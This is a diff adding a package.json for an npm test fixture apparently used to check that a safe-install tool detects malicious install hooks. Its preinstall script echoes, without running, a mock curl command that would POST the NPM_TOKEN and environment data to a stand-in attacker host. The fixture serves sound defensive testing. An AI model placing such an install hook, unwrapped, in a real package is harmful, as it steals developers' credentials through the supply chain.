@@ -1,0 +1,10 @@
+{
+  "name": "malicious-test-pkg",
+  "version": "1.0.0",
+  "description": "Local unpublished test fixture for safe-install security analysis",
+  "type": "module",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "echo [MOCK EXFIL] curl -X POST https://evil-collector.malicious-test.example/leak -H \"Authorization: Bearer $NPM_TOKEN\" -d \"env=process.env\" && echo [SAFE MOCK] No network request was made — this hook exists only to test script detection"
+  }
+}
